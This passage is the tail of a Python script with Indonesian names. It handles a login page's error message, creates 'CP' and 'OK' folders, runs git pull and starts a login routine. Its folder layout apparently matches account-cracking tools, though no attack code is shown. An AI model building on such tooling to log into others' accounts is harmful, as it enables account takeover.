		for opt in range(len(ngew)):
			print(" ["+str(opt+1)+"] "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" [!] %s"%(oh))
	else:
		print(" [!] Login Failed, Please Check Your Id And Password Again")
	
def buat_folder():
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("OK")
	except:pass

if __name__ == "__main__":
	os.system("git pull")
	os.system("touch login.txt")
	buat_folder()
	login()
